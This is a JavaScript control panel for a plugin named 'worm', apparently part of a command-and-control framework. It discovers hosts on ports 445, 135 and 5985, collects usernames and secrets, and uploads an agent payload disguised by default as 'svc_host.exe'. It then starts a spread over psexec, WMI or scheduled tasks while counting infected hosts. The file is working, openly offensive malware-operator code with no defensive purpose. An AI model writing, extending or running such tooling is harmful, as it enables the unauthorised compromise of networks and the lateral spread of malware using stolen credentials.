const PLUGIN_ID = "worm";

let currentClientId = "";
let payloadB64 = "";

const $ = (id) => document.getElementById(id);

async function rpc(method, params = {}) {
  const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ method, params }),
  });
  const body = await res.json().catch(() => ({}));
  if (!body.ok) throw new Error(body.error || `rpc ${method} failed: ${res.status}`);
  return body.result;
}

async function sendEvent(event, payload = {}) {
  if (!currentClientId) {
    log("no client id set", "err");
    return;
  }
  await fetch(`/api/clients/${currentClientId}/plugins/${PLUGIN_ID}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
}

function setBadge(state) {
  const b = $("statusBadge");
  b.className = "badge " + (state || "idle");
  b.textContent = state || "idle";
}

function lines(id) {
  return $(id).value.split("\n").map((s) => s.trim()).filter(Boolean);
}

function collectConfig() {
  return {
    users: lines("users"),
    secrets: lines("secrets"),
    methods: $("methods").value.split(",").map((s) => s.trim()).filter(Boolean),
    maxHosts: parseInt($("maxHosts").value, 10) || 32,
    payloadName: $("payloadName").value.trim() || "svc_host.exe",
    payloadB64,
  };
}

function log(text, kind = "") {
  const el = $("log");
  const line = document.createElement("div");
  line.className = "line" + (kind ? " " + kind : "");
  const ts = document.createElement("span");
  ts.className = "ts";
  ts.textContent = new Date().toLocaleTimeString();
  line.appendChild(ts);
  line.appendChild(document.createTextNode(text));
  el.appendChild(line);
  while (el.children.length > 200) el.removeChild(el.firstChild);
  el.scrollTop = el.scrollHeight;
}

function renderTargets(list) {
  const body = $("targetBody");
  body.innerHTML = "";
  if (!list.length) {
    $("empty").style.display = "block";
    return;
  }
  $("empty").style.display = "none";

  list.forEach((t) => {
    const tr = document.createElement("tr");

    const host = document.createElement("td");
    host.className = "host";
    host.textContent = t.host;

    const ports = document.createElement("td");
    const wrap = document.createElement("div");
    wrap.className = "ports";
    (t.ports || []).forEach((p) => {
      const s = document.createElement("span");
      s.className = "port" + ([445, 135, 5985].includes(p) ? " hot" : "");
      s.textContent = p;
      wrap.appendChild(s);
    });
    ports.appendChild(wrap);

    const status = document.createElement("td");
    const s = document.createElement("span");
    s.className = "status " + (t.status || "new");
    s.textContent = t.status || "new";
    status.appendChild(s);

    const detail = document.createElement("td");
    detail.textContent = t.detail || "";

    tr.appendChild(host);
    tr.appendChild(ports);
    tr.appendChild(status);
    tr.appendChild(detail);
    body.appendChild(tr);
  });
}

function setProgress(done, total, infected) {
  $("progressText").textContent = `${done} / ${total}` + (infected != null ? `  (${infected} infected)` : "");
  const pct = total > 0 ? Math.min(100, Math.round((done / total) * 100)) : 0;
  $("progressFill").style.width = pct + "%";
}

async function loadConfig() {
  if (!currentClientId) return;
  try {
    const cfg = await rpc("get_config", { clientId: currentClientId });
    $("users").value = (cfg.users || []).join("\n");
    $("secrets").value = (cfg.secrets || []).join("\n");
    $("methods").value = (cfg.methods || ["psexec", "wmi", "schtasks"]).join(",");
    $("maxHosts").value = cfg.maxHosts ?? 32;
    $("payloadName").value = cfg.payloadName || "svc_host.exe";
  } catch (e) {}
}

async function loadTargets() {
  if (!currentClientId) return;
  try {
    renderTargets(await rpc("list_targets", { clientId: currentClientId }));
  } catch (e) {}
}

function handleStream(data) {
  if (!data) return;
  const evt = data.event;
  const p = data.payload ?? data;
  if (p && p.clientId && p.clientId !== currentClientId) return;

  switch (evt) {
    case "status":
      setBadge(p.state);
      if (p.detail) log(p.detail);
      break;
    case "targets":
      renderTargets(p.targets || []);
      log(`discovered ${(p.targets || []).length} host(s)`, "ok");
      break;
    case "host":
      loadTargets();
      log(`${p.host}: ${p.status}${p.detail ? " — " + p.detail : ""}`, p.status === "infected" ? "ok" : "");
      break;
    case "progress":
      setProgress(p.done || 0, p.total || 0, p.infected);
      break;
    case "error":
      log(p.message || "error", "err");
      break;
    default:
      break;
  }
}

function connectStream() {
  const es = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
  ["status", "targets", "host", "progress", "error", "spread_started"].forEach((ch) => {
    es.addEventListener(ch, (ev) => {
      let data;
      try { data = JSON.parse(ev.data); } catch { data = null; }
      if (data != null) handleStream({ event: ch, payload: data });
    });
  });
  es.onerror = () => {
    es.close();
    setTimeout(connectStream, 3000);
  };
}

async function refreshClients() {
  try {
    const clients = await rpc("list_clients");
    const dl = $("clientsList");
    dl.innerHTML = "";
    clients.forEach((c) => {
      const o = document.createElement("option");
      o.value = c.clientId;
      dl.appendChild(o);
    });
    $("clientCount").textContent =
      clients.length ? `${clients.length} client(s) seen` : "no clients seen yet";
    if (clients.length && !currentClientId) {
      currentClientId = clients[0].clientId;
      $("clientId").value = currentClientId;
      loadConfig();
      loadTargets();
    }
  } catch (e) {}
}

function bind() {
  $("clientId").addEventListener("change", (e) => {
    currentClientId = e.target.value.trim();
    loadConfig();
    loadTargets();
  });

  $("refreshClients").addEventListener("click", refreshClients);

  $("payloadFile").addEventListener("change", (e) => {
    const f = e.target.files[0];
    if (!f) {
      payloadB64 = "";
      $("payloadInfo").textContent = "no payload loaded";
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      // data:...;base64,XXXX -> keep only the base64 body
      const b64 = String(reader.result).split(",")[1] || "";
      payloadB64 = b64;
      $("payloadInfo").textContent = `${f.name} loaded (${(f.size / 1024).toFixed(0)} KB)`;
    };
    reader.readAsDataURL(f);
  });

  $("discover").addEventListener("click", () => {
    setBadge("scanning");
    sendEvent("discover");
  });

  $("spread").addEventListener("click", async () => {
    if (!currentClientId) {
      log("no client id set", "err");
      return;
    }
    if (!payloadB64) {
      log("load an agent payload first", "err");
      return;
    }
    const cfg = collectConfig();
    try {
      await rpc("save_config", { clientId: currentClientId, config: cfg });
      const res = await rpc("start_spread", { clientId: currentClientId });
      await sendEvent("spread", res.job);
      setBadge("spreading");
      log(`spread started against ${res.job.targets.length} host(s)`);
    } catch (e) {
      log("spread failed: " + e.message, "err");
    }
  });

  $("stopSpread").addEventListener("click", async () => {
    await sendEvent("stop_spread");
    try { await rpc("finish_spread", { clientId: currentClientId }); } catch (e) {}
    log("stop sent");
  });
}

bind();
connectStream();
loadConfig();
loadTargets();
refreshClients();
